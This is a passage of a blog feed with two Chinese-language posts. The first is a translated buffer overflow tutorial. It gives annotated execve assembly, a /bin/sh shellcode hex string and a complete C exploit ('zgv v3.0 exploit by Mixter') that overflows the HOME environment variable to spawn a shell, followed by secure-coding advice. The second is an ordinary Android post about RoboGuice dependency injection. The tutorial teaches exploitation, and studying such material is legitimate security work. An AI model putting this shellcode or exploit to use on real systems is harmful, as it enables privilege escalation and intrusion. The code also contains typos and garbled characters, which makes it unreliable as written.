class="number">0x5da00</span> :       pushl  %ebx   </span><br><span class="line"><span class="comment">/* this is the actual syscall. before a program would call execve, it would  </span><br><span class="line">  push the arguments in reverse order on the stack: **envp, **argv, *filename */</span> </span><br><span class="line"><span class="comment">/* put address of **envp into edx register */</span> </span><br><span class="line"><span class="number">0x5da01</span> :     movl   <span class="number">0</span>×<span class="number">10</span>(%esp,<span class="number">1</span>),%edx  </span><br><span class="line"><span class="comment">/* put address of **argv into ecx register */</span> </span><br><span class="line"><span class="number">0x5da05</span> :     movl   <span class="number">0xc</span>(%esp,<span class="number">1</span>),%ecx  </span><br><span class="line"><span class="comment">/* put address of *filename into ebx register */</span> </span><br><span class="line"><span class="number">0x5da09</span> :     movl   <span class="number">0</span>×<span class="number">8</span>(%esp,<span class="number">1</span>),%ebx  </span><br><span class="line"><span class="comment">/* put 0xb in eax register; 0xb == execve in the internal system call table */</span> </span><br><span class="line"><span class="number">0x5da0d</span> :    movl   $<span class="number">0xb</span>,%eax  </span><br><span class="line"><span class="comment">/* give control to kernel, to execute execve instruction */</span> </span><br><span class="line"><span class="number">0x5da12</span> :    <span class="keyword">int</span>    $<span class="number">0</span>×<span class="number">80</span>  </span><br><span class="line">   </span><br><span class="line"><span class="number">0x5da14</span> :    popl   %ebx  </span><br><span class="line"><span class="number">0x5da15</span> :    cmpl   $<span class="number">0xfffff001</span>,%eax  </span><br><span class="line"><span class="number">0x5da1a</span> :    jae    <span class="number">0x5da1d</span> &lt;__syscall_error&gt;  </span><br><span class="line"><span class="number">0x5da1c</span> :    ret</span><br></pre></td></tr></table></figure>
<p>结束汇编转存。</p>
<h4 id="4-1_使代码可移植">4.1 使代码可移植</h4><p>我们必须应用一个策略使没有参数的Shellcode在内存中的传统方式，通过在它们的页存储上的精确位置，在编译中完成。</p>
<p>一旦我们估计shellcode的大小，我们能够使用指令jmp和call来得到指定的字节在执行线程向前或是向后。为什么使用call?我们有机会使用CALL来自动的在栈内存储返回地址，这个返回地址是在下一个CALL指令后的4个字节。通过放置一个正确的变量通过使用call，我们间接的把地址压进了栈中，没有必要了解它。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0   jmp      (skip Z bytes forward)  </span><br><span class="line">2   popl %esi  </span><br><span class="line">… put function(s) here …  </span><br><span class="line">Z   call &lt;-Z+2&gt; (skip 2 less than Z bytes backward, to POPL)  </span><br><span class="line">Z+5 .string     (first variable)</span><br></pre></td></tr></table></figure>
<p>(注：如果你要写的代码比一个简单的shell还要复杂，可以多次使用上面的代码。字符串放在代码的后面。你知道这些字符串的大小，因此可以计算他们的相对位置，一旦你知道第一个字符串的位置。)</p>
<h4 id="4-2_Shellcode">4.2 Shellcode</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">global code_start           <span class="comment">/* we'll need this later, dont mind it */</span> </span><br><span class="line">global code_end  </span><br><span class="line">       .data  </span><br><span class="line">code_start:  </span><br><span class="line">       jmp  <span class="number">0</span>×<span class="number">17</span>  </span><br><span class="line">       popl %esi  </span><br><span class="line">       movl %esi,<span class="number">0</span>×<span class="number">8</span>(%esi)     <span class="comment">/* put address of **argv behind shellcode,  </span><br><span class="line">                               0×8 bytes behind it so a /bin/sh has place */</span> </span><br><span class="line">       xorl %eax,%eax            <span class="comment">/* put 0 in %eax */</span> </span><br><span class="line">       movb %eax,<span class="number">0</span>×<span class="number">7</span>(%esi)   <span class="comment">/* put terminating 0 after /bin/sh string */</span> </span><br><span class="line">       movl %eax,<span class="number">0xc</span>(%esi)    <span class="comment">/* another 0 to get the size of a long word */</span> </span><br><span class="line">my_execve:  </span><br><span class="line">       movb $<span class="number">0xb</span>,%al             <span class="comment">/* execve(         */</span> </span><br><span class="line">       movl %esi,%ebx           <span class="comment">/* "/bin/sh",      */</span> </span><br><span class="line">       leal <span class="number">0</span>×<span class="number">8</span>(%esi),%ecx      <span class="comment">/* &amp; of "/bin/sh", */</span> </span><br><span class="line">       xorl %edx,%edx           <span class="comment">/* NULL           */</span> </span><br><span class="line">       <span class="keyword">int</span> $<span class="number">0</span>×<span class="number">80</span>        <span class="comment">/* );           */</span> </span><br><span class="line">       call -<span class="number">0x1c</span>  </span><br><span class="line">       .<span class="built_in">string</span> <span class="string">"/bin/shX"</span>   <span class="comment">/* X is overwritten by movb %eax,0×7(%esi) */</span> </span><br><span class="line">code_end:</span><br></pre></td></tr></table></figure>
<p>(相对偏移了0x17和-0x1c通过放在0x0，编译，反汇编和看看shell代码的大小。)</p>
<p>这是一个正在工作着的shellcode，虽然很小。你至少使用exit()来调用和依附它(在调用之前)。Shellcode的正真的艺术还包括避免任何二进制0代码和修改它为例，二进制代码不包含控制和小写字符，这将会过滤掉一些问题程序。大多数的东西是通过自己修改代码来完成的，就是我们想的使用mov %eax,0×7(%esi)指令。我们用\0来取代X，但是在shellcode初始化中没有\0。</p>
<p>让我们测试下这些代码，保存上面的代码为code.S和下面的文件为code.c：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">code_start</span><span class="params">()</span></span>;  </span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">code_end</span><span class="params">()</span></span>;  </span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line">main() &#123; ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>)) code_start)(); &#125;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor"># cc -o code code.S code.c</span></span><br><span class="line"><span class="preprocessor"># ./code</span></span><br><span class="line">bash<span class="preprocessor">#</span></span><br></pre></td></tr></table></figure>
<p>现在你可以把shellcode转变成16进制字符缓冲区。要做到这的最好的方法就是打印：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">code_start</span><span class="params">()</span></span>; <span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">code_end</span><span class="params">()</span></span>;</span><br><span class="line">main() &#123; <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"%s"</span>,code_start);</span><br></pre></td></tr></table></figure>
<p>通过使用aconv –h或bin2c.pl来解析它，可以在<a href="http://www.dec.net/~dhg或是http://members.tripod.com/mixtersecurity上找到工具。" target="_blank" rel="external">http://www.dec.net/~dhg或是http://members.tripod.com/mixtersecurity上找到工具。</a></p>
<h4 id="5_写一个例子">5 写一个例子</h4><p>让我们看看如何改变返回地址指向的shellcode进行压栈，写一个攻击的例子。我们将要采用zgv，因为这是可以利用的一个最简单的事情。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># export HOME=`perl -e 'printf "a" x 2000'`</span><br><span class="line"># zgv</span><br><span class="line">Segmentation fault (core dumped)  </span><br><span class="line"># gdb /usr/bin/zgv core</span><br><span class="line">#0  0×61616161 in ?? ()</span><br><span class="line">(gdb) info register esp  </span><br><span class="line">     esp: 0xbffff574 -1073744524</span><br></pre></td></tr></table></figure>
<p>那么，这是在栈顶的故障时间，安全的假设是我们能够使用这作为我们shellcode的返回地址。</p>
<p>现在我们要在我们的缓冲区前增加一些NOP指令，所以我们没有必要对于我们内存中的shellcode的精确开始的预测100%的正确。这个函数将会返回到栈在我们的shellcode之前，通过这个方式使用NOPs的头文字JMP命令，跳转到CALL，在转回popl，在栈中运行我们的代码。</p>
<p>记住，栈是这样的。在最低级的内存地址，ESP指向栈的顶部，初始变量被储存，即时缓冲器中的zgv储存了HOME环境变量。在那之后，我们保存了EBP和前一个函数的返回地址。我们必须要写8个字节或是更多在缓冲区后面，用栈中的新的地址来覆盖返回地址。</p>
<p>Zgv缓冲器有1024个字节。你可以通过扫视代码来发现，或是通过在脆弱的函数中搜索初始化的subl $0×400,%esp (=1024)。我们可以把这些放在一起来利用。</p>
<h4 id="5-1_zgv攻击实例">5.1 zgv攻击实例</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">/*                   zgv v3.0 exploit by Mixter  </span><br><span class="line">          buffer overflow tutorial – http://1337.tsx.org  </span><br><span class="line"></span><br><span class="line">        sample exploit, works for example with precompiled  </span><br><span class="line">    redhat 5.x/suse 5.x/redhat 6.x/slackware 3.x linux binaries */ </span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">   </span><br><span class="line">/* This is the minimal shellcode from the tutorial */ </span><br><span class="line">static char shellcode[]=  </span><br><span class="line">"\xeb\x17\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d"</span><br><span class="line">"\x4e\x08\x31\xd2\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58";</span><br><span class="line"></span><br><span class="line">#define NOP     0×90</span><br><span class="line">#define LEN     1032</span><br><span class="line">#define RET     0xbffff574</span><br><span class="line"></span><br><span class="line">int main()  </span><br><span class="line">&#123;  </span><br><span class="line">	char buffer[LEN];  </span><br><span class="line">	long retaddr = RET;  </span><br><span class="line">	int i;  </span><br><span class="line"></span><br><span class="line">fprintf(stderr,"using address 0x%lx\n",retaddr);  </span><br><span class="line"></span><br><span class="line">/* this fills the whole buffer with the return address, see 3b) */ </span><br><span class="line">for (i=0;i&lt;LEN;i+=4)  </span><br><span class="line">   *(long *)&amp;buffer[i] = retaddr;  </span><br><span class="line"></span><br><span class="line">/* this fills the initial buffer with NOP's, 100 chars less than the  </span><br><span class="line">   buffer size, so the shellcode and return address fits in comfortably */ </span><br><span class="line">for (i=0;i&lt;LEN-strlen(shellcode)-100);i++)  </span><br><span class="line">   *(buffer+i) = NOP;  </span><br><span class="line">   </span><br><span class="line">/* after the end of the NOPs, we copy in the execve() shellcode */ </span><br><span class="line">memcpy(buffer+i,shellcode,strlen(shellcode));  </span><br><span class="line"></span><br><span class="line">/* export the variable, run zgv */</span><br><span class="line">setenv("HOME", buffer, 1);  </span><br><span class="line">execlp("zgv","zgv",NULL);  </span><br><span class="line">return 0;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* EOF */ </span><br><span class="line"></span><br><span class="line">We now have a string looking like this:</span><br><span class="line">[ ... NOP NOP NOP NOP NOP JMP SHELLCODE CALL /bin/sh RET RET RET RET RET RET ]  </span><br><span class="line">While zgv's stack looks like this: </span><br><span class="line">v– 0xbffff574 is here  </span><br><span class="line">[     S   M   A   L   L   B   U   F   F   E   R   ] [SAVED EBP] [ORIGINAL RET]  </span><br><span class="line">   </span><br><span class="line">The execution thread of zgv is now as follows:  </span><br><span class="line">   </span><br><span class="line">main … -&gt; function() -&gt; strcpy(smallbuffer,getenv("HOME"));</span><br></pre></td></tr></table></figure>
<p>此时，zgv做不到边界检查，写入超出了smallbuffer，返回到main的地址被栈中的返回地址覆盖。function()离不开/ ret和栈中EIP的指向。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xbffff574</span> nop</span><br><span class="line"><span class="number">0xbffff575</span> nop</span><br><span class="line"><span class="number">0xbffff576</span> nop</span><br><span class="line"><span class="number">0xbffff577</span> jmp $<span class="number">0</span>×<span class="number">24</span>                    <span class="number">1</span></span><br><span class="line"><span class="number">0xbffff579</span> popl %esi          <span class="number">3</span> &lt;–\    |</span><br><span class="line">[... shellcode starts here ...]    |    |</span><br><span class="line"><span class="number">0xbffff59b</span> call -$<span class="number">0x1c</span>             <span class="number">2</span> &lt;–/</span><br><span class="line"><span class="number">0xbffff59e</span> .<span class="built_in">string</span> <span class="string">"/bin/shX"</span> </span><br><span class="line">   </span><br><span class="line">Lets test the exploit…  </span><br><span class="line">   </span><br><span class="line"><span class="preprocessor"># cc -o zgx zgx.c  </span></span><br><span class="line"><span class="preprocessor"># ./zgx  </span></span><br><span class="line"><span class="keyword">using</span> address <span class="number">0xbffff574</span>  </span><br><span class="line">bash<span class="preprocessor">#</span></span><br></pre></td></tr></table></figure>
<h4 id="5-2_编写攻击的进一步提示">5.2 编写攻击的进一步提示</h4><p>有很都可以被利用的程序，但还是很脆弱。但是这有很多的技巧，你可以通过过滤等方式得到。还有其他的溢出技术，这并不一定要包括改变返回地址或是只是放回地址。有指针溢出，函数分配的指针能够被覆盖通过一个数据流，改变程序执行的流程。攻击的返回地址指向shell环境指针，shellcode为与那里，而不是在栈上。</p>
<p>对于一个熟练掌握shellcode的人是在根本上的自己修改代码，最初包含可以打印的，非白色的大写字母，然后修改自己它，把shellcode函数放在要执行的栈上。</p>
<p>你应该永远不会有任何二进制0在你的shell代码里，因为如果它包含任何都可能无法正常的工作。但是本文讨论了怎么升华某种汇编指令与其他的命令超出了范围。我也建议读其他大的数据流怎么超出的，通过aleph1，Taeoh Oh和mudge来写的。</p>
<h4 id="5-3_重要注意事项">5.3 重要注意事项</h4><p>你将不能在Windows 或是 Macintosh上使用这个教程，不要和我要cc.exe和gdb.exe。</p>
<h4 id="6_结论">6 结论</h4><p>我们已经知道，一旦用户依赖存在的溢出，在90%的时间了是可以利用的，即使利用起来很困难，同时要一些技能。为什么写这个攻击很重要呢?因为软件企业是无知的。在软件缓冲区溢出方面的漏洞报告已经有了，虽然这些软件没有更新，或是大多数用户没有更新，因为这个漏洞很难被利用，没有人认为这会成为一个安全隐患。然后，漏洞出现了，证明和实践是程序能够利用，而且这就要急于更新了。</p>
<p>作为程序员，写一个安全的程序是一个艰巨的任务，但是要认真的对待。在写入服务器时就变的更加值得关注，任何类型的安全程序，或是suid root的程序，或是设计使用root来运行，如特别的账户或是系统本身。使用范围检查，更喜欢分配动态缓冲器，输入的依赖性，大小，小心/while/etc。收集数据和填充缓冲区，以及一般处理用户很关心的输入的循环是我建议的主要原则。</p>
<p>目前在安全行业取得了显著的成绩，使用非可执行的栈，suid包，防卫程序来核对返回值，边界核查编辑器等技术来阻止溢出问题。你应该在可以使用的情况下使用这些技术，但是不要完全依赖他们。如果你运行vanilla的UNIX的发行版时，不要假设安全，但是有溢出保护或是防火墙/IDS。它不能保证安全，如果你继续使用不安全的程序，因为<em>all</em>安全程序是<em>software</em>和包含自身漏洞的，至少他们不是完美的。如果你频繁的使用updates <em>和</em> security measures，你仍然不能渴望安全，<em>but</em>你可以希望。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>缓冲区溢出出现在用户输入的相关缓冲区内，在一般情况下，这是现在的计算机和网络上的最大的安全隐患之一。这是因为在编程的层次上很容易出现这中问题，这对于不明白或是无法获得源代码的使用者来说是不可见的，很多的这种问题就会被利用。本文就是企图教会新手-C程序员，证明怎么利用一个溢出环境。<br>]]>
    
    </summary>
    
      <category term="攻击" scheme="http://science09.github.io/tags/%E6%94%BB%E5%87%BB/"/>
    
      <category term="缓冲区溢出" scheme="http://science09.github.io/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    
      <category term="技术" scheme="http://science09.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[如何成为一个偷懒又高效的Android开发人员 ]]></title>
    <link href="http://science09.github.io/2014/06/14/%E5%A6%82%E4%BD%95%E6%88%90%E4%B8%BA%E4%B8%80%E4%B8%AA%E5%81%B7%E6%87%92%E5%8F%88%E9%AB%98%E6%95%88%E7%9A%84Android%E5%BC%80%E5%8F%91%E4%BA%BA%E5%91%98/"/>
    <id>http://science09.github.io/2014/06/14/如何成为一个偷懒又高效的Android开发人员/</id>
    <published>2014-06-14T15:22:49.000Z</published>
    <updated>2015-09-10T13:57:05.000Z</updated>
    <content type="html"><![CDATA[<p>Android程序员不情愿写 findViewById()、点击事件监听等重复率较高的代码。那我们如何才能缩短编写业务逻辑代码的时间，并且避免写那些重复的代码呢？所以让我们来成为一个能偷懒又有高效率的Android程序员。想知道怎么做吗？不用急，接下来我就会写到。<br><a id="more"></a><br>有许多第三方的库和框架是可供我们使用。出于种种原因，我们并不知道这些库或者知道但还没用过。有的开发者开发了自己定义的库或者并不想使用第三方的库。如果我们在应用程序开发的过程中使用一些第三方库，也许可以提高程序的可兼容性、漂亮的UI界面、让代码变得整洁等等。所以，我将研究更多像这样的第三方库来帮助初学者和有经验的开发人员。</p>
<p>今天，让我们来讨论下“依赖注入函数库”。</p>
<h4 id="什么是依赖注入?">什么是依赖注入?</h4><p>依赖注入是一种软件设计模式，无论是在运行时还是在编译时，允许删除、改变硬编码依赖性。[来自Wikipedia]（维基百科资源）：</p>
<p>一些常用和普遍的依赖注入库有：</p>
<p>   <img src="PicResource\android-injection-library1.png" alt="android-injection-library1.png"></p>
<p>RoboGuice:<br>  <img src="PicResource\roboguice.png" alt="roboguice.png"><br>Roboguice是一个用于Android应用的依赖注入框架，使用Google官方的Guice库位极大地简化了Android的依赖注入。让你的Android应用开发之路更加平坦顺利，编程更加简单有趣。</p>
<p>当你调用 getIntent()，getExtras()这些函数时你是否经常忘记检查是否为Null？RoboGuice可以帮助你。初始化TextView有必要调用findViewById()吗？不用，RoboGuice已经为你完成了。</p>
<p>通过使用RoboGuice，你可以注入View视图控件、资源、系统服务或者其他任何对象。RoboGuice能帮你精简应用程序的代码。代码越少意味着出现问题或bug的次数也就越少，从而可以把更多的精力花在项目中那些需要编写或修改的部分，使得阅读代码更加容易。</p>
<p>让我们来看看各种RoboGuice 库的使用方法。</p>
<p>####使用RoboGuice库 ：</p>
<ul>
<li><strong>控件注入</strong>：用@InjectViews方法初始化控件，例如：@InjectView（R.id.textview1）TextView textView1。</li>
<li><strong>资源注入</strong>：用@InjectResources方法初始化资源，例如：@InjectResource（R.string.app_name）String name。</li>
<li><strong> 系统服务注入</strong>：用@Inject方法初始化并获取系统服务，例如：@Inject LayoutInflater inflater。</li>
<li><strong>POJO对象注入</strong>：用@Inject方法注入并初始化POJO对象，例如：@Inject Foo foo。</li>
</ul>
<p>####安装</p>
<p>要使用RoboGuice，你需要下载JAR文件并把他们添加到环境变量中：</p>
<ul>
<li><a href="http://repo1.maven.org/maven2/org/roboguice/roboguice/2.0/roboguice-2.0.jar" target="_blank" rel="external">http://repo1.maven.org/maven2/org/roboguice/roboguice/2.0/roboguice-2.0.jar</a></li>
<li><a href="http://repo1.maven.org/maven2/com/google/inject/guice/3.0/guice-3.0-no_aop.jar" target="_blank" rel="external">http://repo1.maven.org/maven2/com/google/inject/guice/3.0/guice-3.0-no_aop.jar</a></li>
<li><a href="http://repo1.maven.org/maven2/com/google/code/findbugs/jsr305/1.3.9/jsr305-1.3.9.jar" target="_blank" rel="external">http://repo1.maven.org/maven2/com/google/code/findbugs/jsr305/1.3.9/jsr305-1.3.9.jar</a></li>
</ul>
<p>我们来看看一个简单的一般事件代码：</p>
<p>####实例</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    TextView textView1;</span><br><span class="line">    TextView textView2;</span><br><span class="line">    ImageView imageView1;</span><br><span class="line">    String name;</span><br><span class="line">    Drawable icLauncher;</span><br><span class="line">    LocationManager locManager;</span><br><span class="line">    LayoutInflater inflater;</span><br><span class="line">    NotificationManager notifyManager;</span><br><span class="line"></span><br><span class="line">    <span class="annotation">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.layout_test);</span><br><span class="line">        textView1 = (TextView) findViewById(R.id.textView1);</span><br><span class="line">        textView2 = (TextView) findViewById(R.id.textView2);</span><br><span class="line">        imageView1 = (ImageView) findViewById(R.id.imageView1);</span><br><span class="line">        name = getString(R.string.app_name);</span><br><span class="line">        icLauncher = getResources().getDrawable(R.id.ic_launcher);</span><br><span class="line">        locManager = (LocationManager) getSystemService(Activity.LOCATION_SERVICE);</span><br><span class="line">        inflater = (LayoutInflater) getSystemService(Activity.LAYOUT_INFLATER_SERVICE);</span><br><span class="line">        notifyManager = (NotificationManager) getSystemService(Activity.NOTIFICATION_SERVICE);</span><br><span class="line">        textView1.setText(<span class="string">"Hello World! RoboGuice demo"</span>);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再看看使用RoboGuice精简代码后神奇之处。</p>
<p>####使用RoboGuice</p>
<p>你先要继承RoboActivity或者RoboFragment，才能使用RoboGuice的依赖注入功能。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestActivity</span> <span class="keyword">extends</span> <span class="title">RoboActivity</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="annotation">@InjectView</span>(R.id.textView1) TextView textView1;</span><br><span class="line">    <span class="annotation">@InjectView</span>(R.id.textView2) TextView textView2;</span><br><span class="line">    <span class="annotation">@InjectView</span>(R.id.imageView1) ImageView imageView1;</span><br><span class="line">    <span class="annotation">@InjectResource</span>(R.string.app_name) String name;</span><br><span class="line">    <span class="annotation">@InjectResource</span>(R.drawable.ic_launcher) Drawable icLauncher;</span><br><span class="line">    <span class="annotation">@Inject</span> LocationManager locManager;</span><br><span class="line">    <span class="annotation">@Inject</span> LayoutInflater inflater;</span><br><span class="line">    <span class="annotation">@Inject</span> NotificationManager notifyManager;</span><br><span class="line">    <span class="annotation">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.layout_test);</span><br><span class="line">        textView1.setText(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这么一对比，我想你肯定明白了为什么要使用RoboGuice？再来看看有哪些好处：</p>
<p>####使用RoboGuice的好处</p>
<ul>
<li>不需要初始化控件，如有需要就用@InjectViews。</li>
<li>不需要初始化系统服务，如有需要就用@Inject。</li>
<li>不需要初始化像Drawable，string以及其他的资源，如有需要就用@InjectResource。</li>
<li>以上实践能帮助你精简代码。</li>
<li>越少的代码，越少的问题和bugs。</li>
<li>少量的代码让Android开发人员省力同时，也让他们能更专注于实际的业务逻辑。</li>
</ul>
<h4 id="RoboGuice和ActionBarSherlock">RoboGuice和ActionBarSherlock</h4><p>正如我前面提到的，你得在RoboActivity和RoboFragment中继承其中一个才能在Activity事件或Fragment中使用RoboGuice。但是如果你已经在项目中使用了ActionBarSherlock去编译呢？那问题就在于，你已经继承了SherlockActivity或SherlockFragmentActivity中的一个。现在问题是，你不能同时使用RoboGuice和ActionBarSherlock。</p>
<p>解决方法是，为Activities和Fragments定义一个基类。然后你就能同时使用RoboGuice和ActionBarSherlock了。</p>
<p>你可以在这里下载一些基类：<br><a href="https://github.com/rtyley/roboguice-sherlock" target="_blank" rel="external">https://github.com/rtyley/roboguice-sherlock</a> 或者下载JAR包也是一样：RoboGuice+Sherlock.jar，你可以任选一个添加到你的项目。</p>
<p>在Android应用程序中，我想我已经做了所有关于RoboGuice用法及好处的研究。如过有什么遗漏，请联系我。在接下来的文章，我会研究其他的函数库好让你成为一个既能偷懒又高效的Android开发人员。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>Android程序员不情愿写 findViewById()、点击事件监听等重复率较高的代码。那我们如何才能缩短编写业务逻辑代码的时间，并且避免写那些重复的代码呢？所以让我们来成为一个能偷懒又有高效率的Android程序员。想知道怎么做吗？不用急，接下来我就会写到。<br>]]>
    
    </summary>
    
      <category term="Android开发" scheme="http://science09.github.io/tags/Android%E5%BC%80%E5%8F%91/"/>
    
      <category term="Android" scheme="http://science09.github.io/categories/Android/"/>
    
  </entry>
  
</feed>
